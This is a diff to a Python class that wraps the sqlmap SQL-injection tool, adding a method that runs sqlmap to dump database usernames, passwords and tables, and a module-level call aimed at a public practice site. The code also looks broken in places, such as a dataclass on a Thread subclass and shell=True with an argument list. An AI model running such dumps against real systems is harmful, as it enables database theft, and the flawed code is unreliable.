@@ -12,22 +12,21 @@ from lib.priority.Priority import PRIORITY
 from lib.priority.Priority import HARMFULL
 from Exceptions.exceptions import SQLJNGOSError
 import subprocess
+from dataclasses import dataclass
 
 #Reference :https://stackoverflow.com/questions/32382793/inheritance-threading-thread-class-does-not-work
 
-
+@dataclass
 class SQLmap(Thread):
-    def __init__(self,url,username=False,password=False,dump=False,columns=False,tables=False,auto=True):
-        self.url = url
-        self.username = username
-        self.password = password
-        self.dump = dump
-        self.columns = columns
-        self.tables = tables
-        self.auto = auto
-        self.os = Operatingsystem()
-        self.platform = Platforms()
-        Thread.__init__(self)
+    url : str
+    username : bool
+    password : bool
+    dump : bool
+    columns : bool
+    tables : bool
+    auto : bool
+    os = Operatingsystem()
+    platform = Platforms()
 
     def _Check_SQlmap(self):
         try:
@@ -83,6 +82,12 @@ class SQLmap(Thread):
             
         else:
             logger.critical("Your system cannot execute sqlmap")
+
+    def Dump_the_tables(self):
+        if self._Check_SQlmap() and self.dump is True:
+            cmd =subprocess.Popen(["sqlmap","-u",self.url,"--username","--password","--dump"],shell=True)
+            cmd.wait()
+
             
             
                 
@@ -95,5 +100,6 @@ class SQLmap(Thread):
 
 
 
-
+obj = SQLmap("http://testphp.vulnweb.com/artists.php?id=1",False,False,True,False,False,False)
+obj.exploit()
 
